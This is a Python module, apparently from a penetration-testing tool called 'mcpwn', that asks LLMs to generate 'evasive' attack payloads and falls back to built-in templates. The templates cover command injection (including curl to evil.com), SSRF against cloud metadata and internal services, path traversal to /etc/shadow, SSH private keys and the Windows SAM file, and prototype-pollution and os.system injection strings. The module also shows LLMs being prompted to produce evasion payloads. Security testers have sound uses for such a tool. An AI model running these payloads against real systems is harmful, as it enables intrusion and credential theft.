"""LLM-guided payload generation for adaptive security testing."""

import json
import logging
from typing import Dict, List

logger = logging.getLogger('mcpwn')


class LLMPayloadGenerator:
    """Context-aware payload synthesis using LLM intelligence."""
    
    def __init__(self, config: Dict):
        self.config = config
        self.enabled = config.get('generation_mode', False)
        self.api_key = config.get('api_key')
        self.client = None
        self.provider = None
        self.model = config.get('model', 'claude-3-5-sonnet-20241022')
        
        if self.enabled and self.api_key:
            # Detect provider by key prefix
            if self.api_key.startswith('sk-ant-'):
                self._init_anthropic()
            elif self.api_key.startswith('AIzaSy'):
                self._init_gemini()
            elif self.api_key.startswith('sk-or-'):
                self._init_openrouter()
            else:
                logger.warning("Unknown API key format. Supported: Anthropic (sk-ant-), Gemini (AIzaSy), OpenRouter (sk-or-)")
                self.enabled = False
        elif self.enabled:
            logger.warning("LLM generation enabled but no API key provided")
            self.enabled = False
    
    def _init_anthropic(self):
        try:
            import anthropic
            self.client = anthropic.Anthropic(api_key=self.api_key)
            self.provider = 'anthropic'
            logger.info("LLM Generator initialized with Anthropic")
        except ImportError:
            logger.warning("anthropic package not installed. Run: pip install anthropic")
            self.enabled = False
    
    def _init_gemini(self):
        try:
            import google.generativeai as genai
            genai.configure(api_key=self.api_key)
            self.client = genai.GenerativeModel('gemini-1.5-flash')
            self.provider = 'gemini'
            logger.info("LLM Generator initialized with Gemini")
        except ImportError:
            logger.warning("google-generativeai package not installed. Run: pip install google-generativeai")
            self.enabled = False
    
    def _init_openrouter(self):
        try:
            import openai
            self.client = openai.OpenAI(
                base_url="https://openrouter.ai/api/v1",
                api_key=self.api_key
            )
            self.provider = 'openrouter'
            logger.info("LLM Generator initialized with OpenRouter")
        except ImportError:
            logger.warning("openai package not installed. Run: pip install openai")
            self.enabled = False
    
    def generate(self, context: Dict) -> List[str]:
        """
        Synthesize novel payloads based on context.
        
        Args:
            context: {
                'tool_name': str,
                'previous_failure': str,
                'schema_hints': dict,
                'target_type': str  # 'rce', 'ssrf', 'traversal', etc.
            }
        
        Returns:
            List of generated payload strings
        """
        if not self.enabled:
            return []
        
        tool_name = context.get('tool_name', 'unknown')
        target_type = context.get('target_type', 'generic')
        failure = context.get('previous_failure', 'None')
        
        # Construct context-aware prompt
        prompt = self._build_prompt(tool_name, target_type, failure)
        
        # Generate payloads (simulated - replace with actual LLM call)
        payloads = self._simulate_generation(tool_name, target_type, prompt)
        
        logger.info(f"Generated {len(payloads)} payloads for {tool_name} ({target_type})")
        return payloads
    
    def _build_prompt(self, tool_name: str, target_type: str, failure: str) -> str:
        """Construct LLM prompt with security testing context."""
        return (
            f"Generate 5 evasive {target_type} payloads for tool '{tool_name}'. "
            f"Previous attempt: {failure}. Output JSON array of strings only."
        )
    
    def _simulate_generation(self, tool_name: str, target_type: str, prompt: str) -> List[str]:
        """Generate payloads using LLM or fallback to templates."""
        if self.client:
            try:
                if self.provider == 'anthropic':
                    response = self.client.messages.create(
                        model=self.model,
                        max_tokens=500,
                        messages=[{"role": "user", "content": prompt}]
                    )
                    if not response.content:
                        raise ValueError("Empty response from Anthropic")
                    content = response.content[0].text
                elif self.provider == 'gemini':
                    response = self.client.generate_content(prompt)
                    if not response.text:
                        raise ValueError("Empty response from Gemini")
                    content = response.text
                elif self.provider == 'openrouter':
                    response = self.client.chat.completions.create(
                        model="meta-llama/llama-3.1-8b-instruct:free",
                        messages=[{"role": "user", "content": prompt}]
                    )
                    if not response.choices:
                        raise ValueError("Empty response from OpenRouter")
                    content = response.choices[0].message.content
                else:
                    raise ValueError(f"Unknown provider: {self.provider}")
                
                if not content:
                    raise ValueError("Empty content from LLM")
                payloads = json.loads(content)
                if isinstance(payloads, list):
                    return payloads[:10]
                raise ValueError("LLM response is not a list")
            except (ValueError, KeyError, AttributeError, json.JSONDecodeError) as e:
                logger.warning("LLM generation failed: %s, using templates", e)
            finally:
                response = None
        
        # Fallback to templates
        seed = hash(prompt) % 1000
        
        templates = {
            'rce': [
                f"$(id>{seed})",
                f"`whoami|base64`",
                f"${{IFS}}cat${{{seed}}}",
                f";curl http://evil.com/{seed}",
                f"&&echo$IFS$9{seed}"
            ],
            'ssrf': [
                f"http://169.254.169.254/latest/meta-data/{seed}",
                "file:///proc/self/environ",
                f"http://localhost:6379/SET{seed}",
                f"gopher://127.0.0.1:25/_{seed}",
                "dict://localhost:11211/stat"
            ],
            'traversal': [
                "....//....//etc/passwd",
                "..%252f..%252f..%252fetc/shadow",
                "..;/..;/..;/root/.ssh/id_rsa",
                "/proc/self/cwd/../../../etc/hosts",
                "\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam"
            ],
            'schema_pollution': [
                f"__proto__[polluted_{seed}]=1",
                f"constructor.prototype.{seed}=true",
                "__class__.__init__.__globals__[os].system('id')",
                f"{{__import__('os').system('{seed}')}}"
            ]
        }
        
        return templates.get(target_type, [f"GEN_{tool_name}_{i}" for i in range(3)])


# Global instance
_GENERATOR = None

def initialize_generator(config: Dict) -> LLMPayloadGenerator:
    """Initialize global generator instance."""
    global _GENERATOR
    _GENERATOR = LLMPayloadGenerator(config)
    return _GENERATOR

def get_generator() -> LLMPayloadGenerator:
    """Access global generator instance."""
    return _GENERATOR
